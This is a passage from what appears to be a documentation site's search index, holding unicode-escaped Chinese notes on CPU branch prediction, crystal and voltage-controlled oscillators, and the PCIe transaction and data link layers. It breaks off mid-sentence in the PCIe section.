<p>\u200b\u5176\u6b21\u200b\uff0c\u200b\u9700\u8981\u200b\u914d\u5408\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u3002\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u4fdd\u8bc1\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u6b63\u786e\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u80fd\u591f\u200b\u5728\u200b\u5faa\u73af\u200b\u4e2d\u200b\u8fbe\u5230\u200b\u63a5\u8fd1\u200b 100% \u200b\u7684\u200b\u6027\u80fd\u200b\uff0c\u200b\u90a3\u4e48\u200b\uff0c\u200b\u5728\u200b Fetch \u200b\u5206\u652f\u200b\u7ed3\u5c3e\u200b\u7684\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u7684\u200b\u540c\u65f6\u200b\uff0c\u200b\u9700\u8981\u200b\u4fdd\u8bc1\u200b\u4e0b\u200b\u4e00\u6b21\u200b Fetch \u200b\u5df2\u7ecf\u200b\u5f97\u5230\u200b\u4e86\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u7684\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u5c31\u662f\u200b BOOM \u200b\u91cc\u9762\u200b\u7684\u200b L0 BTB (1-cycle redirect)\u3002\u200b\u4f46\u662f\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u5468\u671f\u200b\u5185\u200b\u5b8c\u6210\u200b\u7684\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u9762\u79ef\u200b\u80af\u5b9a\u200b\u4e0d\u80fd\u200b\u5927\u200b\uff0c\u200b\u5426\u5219\u200b\u65f6\u5e8f\u200b\u65e0\u6cd5\u200b\u6ee1\u8db3\u200b\uff0c\u200b\u6240\u4ee5\u200b BOOM \u200b\u91cc\u9762\u200b\u8fd8\u200b\u8bbe\u8ba1\u200b\u4e86\u200b 2-cycle \u200b\u548c\u200b 3-cycle \u200b\u7684\u200b\u6bd4\u8f83\u200b\u9ad8\u7ea7\u200b\u7684\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\uff0c\u200b\u8fd8\u6709\u200b\u9488\u5bf9\u200b\u51fd\u6570\u8c03\u7528\u200b\u7684\u200b RAS\uff08Return Address Stack\uff09\u3002</p> <p>\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u4e5f\u200b\u6709\u200b\u5f88\u591a\u200b\u65b9\u6cd5\u200b\u3002\u200b\u6bd4\u8f83\u7b80\u5355\u200b\u7684\u200b\u65b9\u6cd5\u200b\u662f\u200b\u5b9e\u73b0\u200b\u4e00\u4e2a\u200b BHT\uff0c\u200b\u6bcf\u4e2a\u200b\u9879\u662f\u200b\u4e00\u4e2a\u200b 2 \u200b\u4f4d\u200b\u7684\u200b\u9971\u548c\u200b\u8ba1\u6570\u5668\u200b\uff0c\u200b\u8d85\u8fc7\u200b\u4e00\u534a\u200b\u7684\u200b\u65f6\u5019\u200b\u589e\u52a0\u200b\uff0c\u200b\u5c11\u4e8e\u200b\u4e00\u534a\u200b\u65f6\u200b\u51cf\u5c11\u200b\u3002\u200b\u4f46\u662f\u200b\uff0c\u200b\u5982\u679c\u200b\u9047\u5230\u200b\u4e86\u200b\u8df3\u8f6c\u200b/\u200b\u4e0d\u200b\u8df3\u8f6c\u200b/\u200b\u8df3\u8f6c\u200b/\u200b\u4e0d\u200b\u8df3\u8f6c\u200b\u8fd9\u79cd\u200b\u6765\u56de\u200b\u5207\u6362\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u51c6\u786e\u7387\u200b\u5c31\u200b\u5f88\u200b\u4f4e\u200b\u3002\u200b\u4e00\u4e2a\u200b\u590d\u6742\u200b\u4e00\u4e9b\u200b\u7684\u200b\u8bbe\u8ba1\u200b\uff0c\u200b\u5c31\u662f\u200b\u7528\u200b BHR\uff0c\u200b\u8bb0\u5f55\u200b\u8fd9\u4e2a\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u6700\u8fd1\u200b\u51e0\u6b21\u200b\u7684\u200b\u5386\u53f2\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u6bcf\u79cd\u200b\u53ef\u80fd\u200b\u7684\u200b\u5386\u53f2\u200b\uff0c\u200b\u90fd\u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b 2 \u200b\u4f4d\u200b\u7684\u200b\u9971\u548c\u200b\u8ba1\u6570\u5668\u200b\u3002\u200b\u8fd9\u6837\u200b\uff0c\u200b\u9047\u5230\u200b\u521a\u624d\u200b\u6240\u8bf4\u200b\u7684\u200b\u60c5\u51b5\u200b\u5c31\u200b\u4f1a\u200b\u5f88\u200b\u597d\u200b\u5730\u200b\u9884\u6d4b\u200b\u3002\u200b\u4f46\u200b\u5b9e\u8df5\u200b\u4e2d\u200b\u4f1a\u200b\u9047\u5230\u200b\u95ee\u9898\u200b\uff1a\u200b\u5982\u679c\u200b\u5728\u200b\u5199\u200b\u56de\u200b\u4e4b\u524d\u200b\uff0c\u200b\u53c8\u200b\u8fdb\u884c\u200b\u4e86\u200b\u4e00\u6b21\u200b\u9884\u6d4b\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u9884\u6d4b\u200b\u662f\u200b\u5728\u200b\u53d6\u6307\u200b\u7684\u200b\u65f6\u5019\u200b\u505a\u200b\u7684\u200b\uff0c\u200b\u4f46\u662f\u200b\u66f4\u65b0\u200b BPU \u200b\u662f\u200b\u5728\u200b\u5199\u200b\u56de\u200b\u7684\u200b\u65f6\u5019\u200b\u5b8c\u6210\u200b\u7684\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u9884\u6d4b\u200b\u5c31\u662f\u200b\u57fa\u4e8e\u200b\u65e7\u200b\u7684\u200b\u72b6\u6001\u200b\u8fdb\u884c\u200b\u9884\u6d4b\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b BHR \u200b\u5c31\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u4e0d\u200b\u51c6\u786e\u200b\u7684\u200b\u95ee\u9898\u200b\uff1b\u200b\u800c\u4e14\u200b\u5199\u56de\u200b BPU \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u6309\u7167\u200b\u539f\u6765\u200b\u7684\u200b\u72b6\u6001\u200b\u8fdb\u884c\u200b\u66f4\u65b0\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u72b6\u6001\u200b\u53ef\u80fd\u200b\u4e5f\u200b\u662f\u200b\u9519\u8bef\u200b\u7684\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u4e22\u5931\u200b\u4e00\u6b21\u200b\u66f4\u65b0\u200b\uff0c\u200b\u8bc6\u522b\u200b\u7684\u200b\u6a21\u5f0f\u200b\u4ece\u200b\u8df3\u8f6c\u200b/\u200b\u4e0d\u200b\u8df3\u8f6c\u200b/\u200b\u8df3\u8f6c\u200b/\u200b\u4e0d\u200b\u8df3\u200b\u8f6c\u53d8\u6210\u200b\u4e86\u200b\u8df3\u8f6c\u200b/\u200b\u8df3\u8f6c\u200b/\u200b\u8df3\u8f6c\u200b/\u200b\u4e0d\u200b\u8df3\u8f6c\u200b\uff0c\u200b\u8fd9\u6837\u200b\u53c8\u200b\u4f1a\u200b\u9884\u6d4b\u200b\u9519\u8bef\u200b\u3002\u200b\u4e00\u4e2a\u200b\u89e3\u51b3\u529e\u6cd5\u200b\u662f\u200b\uff0c\u200b\u5728\u200b\u53d6\u6307\u200b\u9636\u6bb5\u200b\uff0cBPU \u200b\u9884\u6d4b\u200b\u5b8c\u200b\u5c31\u200b\u7acb\u5373\u200b\u6309\u7167\u200b\u9884\u6d4b\u200b\u7684\u200b\u7ed3\u679c\u200b\u66f4\u65b0\u200b BHR\uff0c\u200b\u4e4b\u540e\u200b\u5199\u56de\u200b\u9636\u6bb5\u200b\u4f1a\u200b\u6062\u590d\u200b\u5230\u200b\u5b9e\u9645\u200b\u7684\u200b BHR \u200b\u53d6\u503c\u200b\u3002\u200b\u8bba\u6587\u200b The effect of speculatively updating branch history on branch prediction accuracy, revisited \u200b\u548c\u200b Speculative Updates of Local and Global Branch History: A Quantitative Analysis \u200b\u8ba8\u8bba\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u5b9e\u73b0\u200b\u65b9\u5f0f\u200b\u5bf9\u200b\u6027\u80fd\u200b\u7684\u200b\u5f71\u54cd\u200b\u3002</p> <p>\u200b\u6bd4\u8f83\u200b\u5bb9\u6613\u200b\u505a\u200b\u9884\u6d4b\u200b\u66f4\u65b0\u200b\u548c\u200b\u6062\u590d\u200b\u7684\u200b\u662f\u200b\u5168\u5c40\u200b\u5206\u652f\u200b\u5386\u53f2\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7ef4\u62a4\u200b\u4e24\u4e2a\u200b GHR\uff08Global History Register\uff09\uff0c\u200b\u4e00\u4e2a\u200b\u662f\u200b\u76ee\u524d\u200b\u53d6\u6307\u4ee4\u200b\u6700\u65b0\u200b\u7684\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u662f\u200b\u63d0\u4ea4\u200b\u7684\u200b\u6700\u65b0\u200b\u7684\u200b\u3002\u200b\u5728\u200b\u9884\u6d4b\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7528\u200b GHR \u200b\u53bb\u200b\u627e\u200b\u5bf9\u5e94\u200b\u7684\u200b 2-bit \u200b\u72b6\u6001\u200b\uff0c\u200b\u7136\u540e\u200b\u628a\u200b\u9884\u6d4b\u200b\u7ed3\u679c\u200b\u66f4\u65b0\u200b\u5230\u200b GHR \u200b\u4e0a\u200b\u3002\u200b\u5728\u200b\u9884\u6d4b\u200b\u5931\u8d25\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u628a\u200b GHR \u200b\u6062\u590d\u200b\u4e3a\u200b\u63d0\u4ea4\u200b\u7684\u200b\u72b6\u6001\u200b\u3002\u200b\u5982\u679c\u200b\u8981\u200b\u652f\u6301\u200b\u4e00\u4e2a\u200b Fetch Packet \u200b\u4e2d\u6709\u200b\u591a\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8ba9\u200b GHR \u200b\u5bf9\u5e94\u200b\u82e5\u5e72\u4e2a\u200b 2-bit \u200b\u72b6\u6001\u200b\uff0c\u200b\u5206\u522b\u200b\u5bf9\u5e94\u200b\u76f8\u5e94\u200b\u4f4d\u7f6e\u200b\u4e0a\u200b\u7684\u200b\u5206\u652f\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u5f53\u7136\u200b\u8fd9\u6837\u200b\u9762\u79ef\u200b\u4e5f\u200b\u4f1a\u200b\u589e\u52a0\u200b\u5f88\u591a\u200b\u3002</p>"},{"location":"hardware/oscillator.html","title":"\u632f\u8361\u5668","text":"<p>\u200b\u632f\u8361\u5668\u200b\uff08Oscillator\uff09\u200b\u5728\u200b\u7535\u8def\u200b\u4e2d\u200b\u7528\u4e8e\u200b\u751f\u6210\u200b\u65f6\u949f\u200b\u4fe1\u53f7\u200b\u3002\u200b\u632f\u8361\u5668\u200b\u6839\u636e\u200b\u539f\u7406\u200b\u53ef\u4ee5\u200b\u5206\u4e3a\u200b\u4ee5\u4e0b\u200b\u7684\u200b\u7c7b\u578b\u200b\uff1a</p> <ol> <li>Harmonic Oscillator\uff1a\u200b\u632f\u8361\u5668\u200b\u7531\u200b\u653e\u5927\u5668\u200b\u548c\u200b\u6ee4\u6ce2\u5668\u200b\u7ec4\u6210\u200b\uff0c\u200b\u8f93\u51fa\u200b\u4e00\u4e2a\u200b\u6b63\u5f26\u200b\u65f6\u949f\u200b\u4fe1\u53f7\u200b</li> <li>Relaxation Oscillator\uff1a\u200b\u8f93\u51fa\u200b\u65b9\u6ce2\u200b\u6216\u8005\u200b\u952f\u9f7f\u200b\u6ce2\u200b\u6216\u8005\u200b\u4e09\u89d2\u200b\u6ce2\u200b\u65f6\u949f\u200b\u4fe1\u53f7\u200b</li> </ol>"},{"location":"hardware/oscillator.html#_2","title":"\u6676\u4f53\u632f\u8361\u5668","text":"<p>\u200b\u6676\u4f53\u632f\u8361\u5668\u200b\uff08Crystal oscillator\uff09\u200b\u7b80\u79f0\u200b\u6676\u632f\u200b\uff0c\u200b\u5e38\u89c1\u4e8e\u200b PCB\uff0c\u200b\u7528\u6765\u200b\u7ed9\u200b\u82af\u7247\u200b\u63d0\u4f9b\u200b\u5916\u90e8\u200b\u7684\u200b\u65f6\u949f\u200b\u4fe1\u53f7\u200b\u3002\u200b\u5b9e\u9645\u4e0a\u200b\uff0c\u200b\u6676\u632f\u662f\u200b\u4e2a\u200b\u88ab\u52a8\u200b\u5143\u4ef6\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u5b83\u200b\u4e0d\u4f1a\u200b\u81ea\u52a8\u200b\u751f\u6210\u200b\u65f6\u949f\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u8fd8\u200b\u9700\u8981\u200b\u82af\u7247\u200b\u5185\u90e8\u200b\u7684\u200b\u7535\u8def\u200b\u8fdb\u884c\u200b\u914d\u5408\u200b\u3002</p> <p>\u200b\u6bd4\u8f83\u200b\u5e38\u89c1\u200b\u7684\u200b\u4f7f\u7528\u200b\u6676\u632f\u200b\u4ea7\u751f\u200b\u65f6\u949f\u200b\u4fe1\u53f7\u200b\u7684\u200b\u7535\u8def\u200b\u662f\u200b Pierce oscillator\uff1a</p> <p> </p> Pierce oscillator\uff08\u200b\u56fe\u6e90\u200b\u7ef4\u57fa\u767e\u79d1\u200b\uff09 <p>\u200b\u5176\u4e2d\u200b \\(U_1\\) \u200b\u662f\u200b\u53cd\u76f8\u5668\u200b\uff08Inverter\uff09\uff0c\\(X_1\\) \u200b\u662f\u200b\u6676\u632f\u200b\u3002\u200b\u6709\u65f6\u5019\u200b\u7535\u8def\u200b\u8fd8\u4f1a\u200b\u6dfb\u52a0\u200b\u4e0a\u56fe\u200b\u4e2d\u200b\u6ca1\u6709\u200b\u753b\u51fa\u200b\u7684\u200b\u989d\u5916\u200b\u7684\u200b\u7535\u963b\u200b\u6216\u200b\u7535\u5bb9\u200b\u3002</p> <p>\u200b\u5728\u200b\u5d4c\u5165\u5f0f\u200b\u8bbe\u8ba1\u200b\u4e2d\u200b\uff0c\u200b\u7ecf\u5e38\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u82af\u7247\u200b\u6709\u200b XI \u200b\u548c\u200b XO \u200b\u5f15\u811a\u200b\uff0c\u200b\u8fde\u63a5\u200b\u5230\u200b PCB \u200b\u4e0a\u200b\u7684\u200b\u6676\u632f\u200b\u4ee5\u53ca\u200b\u4e24\u4e2a\u200b\u7535\u5bb9\u200b\uff0c\u200b\u5b9e\u9645\u4e0a\u200b\u5c31\u200b\u5bf9\u5e94\u200b\u4e86\u200b\u4e0a\u200b\u56fe\u200b\u7684\u200b \\(X_1\\)\u3001\\(C_1\\) \u200b\u548c\u200b \\(C_2\\)\uff0c\u200b\u800c\u200b\u4e0a\u200b\u56fe\u200b\u4e2d\u200b\u7684\u200b \\(U_1\\) \u200b\u548c\u200b \\(R_1\\) \u200b\u653e\u5728\u200b\u82af\u7247\u200b\u5185\u90e8\u200b\u3002\u200b\u56e0\u6b64\u200b\u5728\u200b\u5f88\u591a\u200b\u82af\u7247\u200b\u7684\u200b\u6587\u6863\u200b\u4e2d\u200b\uff0c\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u7c7b\u4f3c\u200b\u4e0b\u9762\u200b\u7684\u200b\u793a\u610f\u56fe\u200b\uff1a</p> <p> </p> \u200b\u6676\u632f\u200b\u4e0e\u200b\u82af\u7247\u200b\u7684\u200b\u8fde\u63a5\u200b\uff08\u200b\u56fe\u6e90\u200bKSZ9031RNX Datasheet\uff09 <p>\u200b\u8fd9\u91cc\u200b\u7684\u200b\u6676\u632f\u200b\uff08\\(X_1\\)\uff09\u200b\u662f\u200b\u65e0\u6e90\u200b\u6676\u632f\u200b\uff0c\u200b\u5b83\u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b\u662f\u200b\u4e00\u4e2a\u200b\u54c1\u8d28\u56e0\u6570\u200b\uff08Q factor\uff09\u200b\u5f88\u200b\u9ad8\u200b\u7684\u200b\u6ee4\u6ce2\u5668\u200b\uff0c\u200b\u9700\u8981\u200b\u501f\u52a9\u200b\u82af\u7247\u200b\u5185\u200b\u7684\u200b\u632f\u8361\u7535\u8def\u200b\u624d\u200b\u53ef\u4ee5\u200b\u4ea7\u751f\u200b\u65f6\u949f\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u72ec\u7acb\u200b\u5de5\u4f5c\u200b\uff0c\u200b\u6240\u4ee5\u200b\u79f0\u4f5c\u200b\u65e0\u6e90\u200b\u6676\u632f\u200b\u3002\u200b\u5982\u679c\u200b\u628a\u200b Pierce oscillator \u200b\u7535\u8def\u200b\u548c\u200b\u6676\u632f\u200b\u7ec4\u5408\u200b\u5728\u200b\u4e00\u4e2a\u200b\u82af\u7247\u200b\u91cc\u200b\uff0c\u200b\u5c31\u200b\u5f97\u5230\u200b\u4e86\u200b\u6709\u6e90\u200b\u6676\u632f\u200b\u3002\u200b\u5f88\u591a\u200b\u82af\u7247\u200b\u65e2\u200b\u652f\u6301\u200b\u65e0\u6e90\u200b\u6676\u632f\u200b\uff08\u200b\u63a5\u200b XI \u200b\u548c\u200b XO\uff09\uff0c\u200b\u53c8\u200b\u652f\u6301\u200b\u6709\u6e90\u200b\u6676\u632f\u200b\uff08\u200b\u53ea\u63a5\u200b XI\uff0c\u200b\u4e0d\u63a5\u200b XO\uff09\u3002</p> <p>Pierce oscillator \u200b\u8f93\u51fa\u200b\u7684\u200b\u662f\u200b\u6b63\u5f26\u6ce2\u200b\uff0c\u200b\u5982\u679c\u200b\u60f3\u8981\u200b\u53d8\u6210\u200b\u65b9\u6ce2\u200b\u4f9b\u200b\u6570\u5b57\u7535\u8def\u200b\u4f7f\u7528\u200b\uff0c\u200b\u8fd8\u200b\u9700\u8981\u200b\u518d\u200b\u7ecf\u8fc7\u200b\u4e00\u4e2a\u200b\u53cd\u76f8\u5668\u200b\u3002</p> <p>\u200b\u5e38\u89c1\u200b\u7684\u200b\u6676\u632f\u200b\u6750\u6599\u200b\u6709\u200b\u77f3\u82f1\u200b\uff08Quartz\uff09\u200b\u548c\u200b\u9676\u74f7\u200b\uff08Ceramics\uff09\uff0c\u200b\u4e00\u822c\u200b\u77f3\u82f1\u200b\u7cbe\u5ea6\u200b\u66f4\u9ad8\u200b\u3002</p> <p>XTAL \u200b\u662f\u200b Crystal \u200b\u7684\u200b\u7f29\u5199\u200b\uff0cXO \u200b\u662f\u200b Crystal Oscillator \u200b\u7684\u200b\u7f29\u5199\u200b\u3002\u200b\u7531\u4e8e\u200b XO \u200b\u6bd4\u200b XTAL \u200b\u591a\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u632f\u8361\u5668\u200b\uff0c\u200b\u6240\u4ee5\u200b\u4e00\u822c\u200b XTAL \u200b\u6307\u200b\u7684\u200b\u662f\u200b\u65e0\u6e90\u200b\u6676\u632f\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u6676\u4f53\u200b\u672c\u8eab\u200b\uff0cXO \u200b\u6307\u200b\u7684\u200b\u662f\u200b\u6709\u6e90\u200b\u6676\u632f\u200b\u3002</p>"},{"location":"hardware/oscillator.html#voltage-controlled-oscillator","title":"Voltage Controlled Oscillator","text":"<p>Voltage Controlled Oscillator \u200b\u662f\u200b\u538b\u63a7\u200b\u632f\u8361\u5668\u200b\uff0c\u200b\u7f29\u5199\u200b VCO\uff0c\u200b\u610f\u601d\u200b\u662f\u200b\u53ef\u4ee5\u200b\u7531\u200b\u7535\u538b\u200b\u63a7\u5236\u200b\u7684\u200b\u632f\u8361\u5668\u200b\uff0c\u200b\u5728\u200b\u9501\u76f8\u73af\u200b\u4e2d\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b VCO \u200b\u7684\u200b\u8eab\u5f71\u200b\u3002</p> <p>\u200b\u4ee5\u200b LC \u200b\u632f\u8361\u7535\u8def\u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u5176\u200b\u632f\u8361\u200b\u9891\u7387\u200b\u4e0e\u200b\u7535\u611f\u200b\u548c\u200b\u7535\u5bb9\u200b\u5927\u5c0f\u200b\u6709\u5173\u200b\uff0c\u200b\u5982\u679c\u200b\u53ef\u4ee5\u200b\u63a7\u5236\u200b\u7535\u5bb9\u200b\u5927\u5c0f\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u95f4\u63a5\u200b\u5730\u200b\u63a7\u5236\u200b\u632f\u8361\u5668\u200b\u7684\u200b\u632f\u8361\u200b\u9891\u7387\u200b\u3002\u200b\u800c\u200b P-N \u200b\u7ed3\u200b\u5de5\u4f5c\u200b\u5728\u200b\u53cd\u5411\u200b\u504f\u7f6e\u200b\u72b6\u6001\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5176\u200b\u7535\u5bb9\u200b\u5927\u5c0f\u200b\u4e0e\u200b\u4e24\u7aef\u200b\u7684\u200b\u7535\u538b\u200b\u76f8\u5173\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u7528\u200b P-N \u200b\u7ed3\u548c\u200b LC \u200b\u632f\u8361\u7535\u8def\u200b\u6765\u200b\u5b9e\u73b0\u200b VCO\u3002</p>"},{"location":"hardware/pcie.html","title":"PCIe (Peripheral Component Interconnect Express)","text":""},{"location":"hardware/pcie.html#_1","title":"\u5206\u5c42","text":"<p>PCIe \u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e09\u4e2a\u200b\u5c42\u200b\uff1aTransaction Layer\uff0cData Link Layer\uff0cPhysical Layer\uff0c\u200b\u548c\u200b TCP/IP \u200b\u56db\u5c42\u200b\u6a21\u578b\u200b\u5f88\u200b\u50cf\u200b\u3002PCIe \u200b\u4e5f\u200b\u662f\u200b\u57fa\u4e8e\u200b Packet \u200b\u4f20\u8f93\u200b\u7684\u200b\u3002</p> <p> </p> PCIe \u200b\u5206\u5c42\u200b\uff08\u200b\u56fe\u6e90\u200b PCIe 3.0 \u200b\u6807\u51c6\u200b\uff09"},{"location":"hardware/pcie.html#transaction-layer","title":"Transaction Layer","text":"<p>Transaction Layer \u200b\u7684\u200b\u6838\u5fc3\u200b\u662f\u200b Transaction Layer Packet(TLP)\u3002TLP \u200b\u683c\u5f0f\u200b\uff1a</p> <p> </p> PCIe TLP \u200b\u683c\u5f0f\u200b\uff08\u200b\u56fe\u6e90\u200b PCIe 3.0 \u200b\u6807\u51c6\u200b\uff09 <p>\u200b\u5373\u53ef\u200b\u9009\u200b\u7684\u200b\u82e5\u5e72\u4e2a\u200b Prefix\uff0c\u200b\u4e00\u4e2a\u200b Header\uff0c\u200b\u53ef\u9009\u200b\u7684\u200b Data Payload\uff0c\u200b\u53ef\u9009\u200b\u7684\u200b Digest\u3002</p> <p>Prefix \u200b\u548c\u200b Header \u200b\u5f00\u5934\u200b\u7684\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\u662f\u200b <code>Fmt[2:0]</code> \u200b\u548c\u200b <code>Type[4:0]</code> \u200b\u5b57\u200b\u6bb5\u200b\u3002Fmt \u200b\u51b3\u5b9a\u200b\u4e86\u200b header \u200b\u7684\u200b\u957f\u5ea6\u200b\uff0c\u200b\u6709\u65e0\u200b\u6570\u636e\u200b\uff0c\u200b\u6216\u8005\u200b\u8fd9\u662f\u200b\u4e00\u4e2a\u200b Prefix\u3002</p> <p>\u200b\u5b83\u200b\u652f\u6301\u200b\u51e0\u7c7b\u200b Packet\uff1a</p> <ul> <li>Memory: MMIO<ul> <li>Read Request(MRd)/Completion(CplD)</li> <li>Write Request(MWr): \u200b\u6ce8\u610f\u200b\u53ea\u6709\u200b Request\uff0c\u200b\u6ca1\u6709\u200b Completion</li> <li>AtomicOp Request(FetchAdd/Swap/CAS)/Completion(CplD)</li> <li>Locked Memory Read(MRdLk)/Completion(CplDLk): Legacy</li> </ul> </li> <li>IO: Legacy<ul> <li>Read Request(IORd)/Completion(CplD)</li> <li>Write Request(IOWr)/Completion(Cpl)</li> </ul> </li> <li>Configuration: \u200b\u8bbf\u95ee\u200b\u914d\u7f6e\u200b\u7a7a\u95f4\u200b<ul> <li>Read Request(CfgRd0/CfgRd1)/Completion(CplD)</li> <li>Write Request(CfgWr0/CfgWr1)/Completion(Cpl)</li> </ul> </li> <li>Message: \u200b\u4f20\u8f93\u200b event<ul> <li>Request(Msg/MsgD)</li> </ul> </li> </ul> <p>\u200b\u62ec\u53f7\u200b\u91cc\u200b\u7684\u200b\u662f\u200b TLP Type\uff0c\u200b\u5bf9\u5e94\u200b\u4e86\u200b\u5b83\u200b Fmt \u200b\u548c\u200b Type \u200b\u5b57\u6bb5\u200b\u7684\u200b\u53d6\u503c\u200b\u3002\u200b\u5982\u679c\u200b Completion \u200b\u5931\u8d25\u200b\u4e86\u200b\uff0c\u200b\u539f\u6765\u200b\u5e94\u8be5\u200b\u662f\u200b CplD/CplDLk \u200b\u7684\u200b Completion \u200b\u4f1a\u200b\u53d8\u6210\u200b\u4e0d\u5e26\u200b\u6570\u636e\u200b\u7684\u200b Cpl/CplLk\u3002</p> <p>\u200b\u5728\u200b PCIe 3.0 \u200b\u6807\u51c6\u200b\u7684\u200b\u8868\u200b 2-3 \u200b\u4e2d\u200b\u5217\u51fa\u200b\u4e86\u200b TLP Type \u200b\u4ee5\u53ca\u200b\u5bf9\u5e94\u200b\u7684\u200b Fmt \u200b\u548c\u200b Type \u200b\u7f16\u7801\u200b\u3002</p> <p>TLP \u200b\u8def\u7531\u200b\u6709\u200b\u4e09\u4e2a\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u51b3\u5b9a\u200b\u4e86\u200b\u8fd9\u4e2a\u200b TLP \u200b\u76ee\u7684\u5730\u200b\u662f\u200b\u54ea\u91cc\u200b\uff1a</p> <ul> <li>Address-based: 32 \u200b\u4f4d\u200b\u6216\u200b 64 \u200b\u4f4d\u200b\u5730\u5740\u200b\uff0c\u200b\u7528\u4e8e\u200b Memory \u200b\u548c\u200b IO \u200b\u8bf7\u6c42\u200b</li> <li>ID-based\uff1alspci \u200b\u770b\u5230\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b Bus Device Function\uff0c\u200b\u7528\u4e8e\u200b Configuration \u200b\u8bf7\u6c42\u200b</li> <li>Implicit\uff1a\u200b\u7528\u4e8e\u200b Message \u200b\u8bf7\u6c42\u200b\uff0c\u200b\u8def\u7531\u200b\u65b9\u6cd5\u200b\uff1a<ul> <li>Routed to Root Complex</li> <li>Routed by Address: PCIe 3.0 \u200b\u6807\u51c6\u200b\u4e2d\u200b\u6ca1\u6709\u200b\u7528\u200b\u8fd9\u4e2a\u200b\u8def\u7531\u200b\u65b9\u6cd5\u200b\u7684\u200b Message</li> <li>Routed by ID</li> <li>Broadcast from Root Complex</li> <li>Local - Terminate at Receiver</li> <li>Gathered and router to Root Complex</li> </ul> </li> </ul>"},{"location":"hardware/pcie.html#data-link-layer","title":"Data Link Layer","text":"<p>Data Link Layer \u200b\u7684\u200b\u4e3b\u8981\u200b\u529f\u80fd\u200b\u662f\u200b\u8fdb\u884c\u200b TLP \u200b\u7684\u200b\u53ef\u9760\u200b\u4f20\u8f93\u200b\u3002\u200b\u5b83\u200b\u5728\u200b\u4f20\u8f93\u200b TLP \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u5728\u200b\u5f00\u5934\u200b\u52a0\u4e0a\u200b\u4e00\u4e2a\u200b\u4e24\u200b\u5b57\u8282\u200b\u7684\u200b Sequence Number\uff0c\u200b\u6700\u540e\u200b\u52a0\u4e0a\u200b\u4e00\u4e2a\u200b\u56db\u200b\u5b57\u8282\u200b\u7684\u200b LCRC\uff08Link CRC\uff09\u3002</p> <p> </p> PCIe TLP Data Link Layer \u200b\u683c\u5f0f\u200b\uff08\u200b\u56fe\u6e90\u200b PCIe 3.0 \u200b\u6807\u51c6\u200b\uff09 <p>\u200b\u9664\u4e86\u200b\u4f20\u8f93\u200b TLP\uff0cData Link Layer \u200b\u8fd8\u4f1a\u200b\u4f20\u8f93\u200b Data Link Layer Packet(DLLP)\uff0c\u200b\u7c7b\u578b\u200b\u5305\u62ec\u200b\uff1a</p> <ul> <li>Ack DLLP: \u200b\u544a\u8bc9\u200b\u5bf9\u65b9\u200b\u81ea\u5df1\u200b\u5df2\u7ecf\u200b\u6210\u529f\u200b\u6536\u5230\u200b\u4e86\u200b TLP</li> <li>Nak DLLP\uff1a\u200b\u544a\u8bc9\u200b\u5bf9\u65b9\u200b\u81ea\u5df1\u200b\u63a5\u6536\u200b TLP \u200b\u5931\u8d25\u200b\uff0c\u200b\u8bf7\u200b\u91cd\u8bd5\u200b</li> <li>InitFC1/InitFC2/UpdateFC DLLPs\uff1a\u200b\u6d41\u91cf\u200b\u63a7\u5236\u200b</li> <li>PM_Enter_L1/PM_Enter_L23/PM_Active_State_Request_L1/PM_Request_Ack\uff1a\u200b\u7528\u4e8e\u200b\u7535\u6e90\u200b\u7ba1\u7406\u200b</li> </ul> <p>Data Link Layer \u200b\u6536\u5230\u200b\u4e0a\u5c42\u200b\u8981\u200b\u53d1\u9001\u200b TLP \u200b\u65f6\u5019\u200b\uff0c\u200b\u9996\u5148\u200b\u62fc\u63a5\u200b 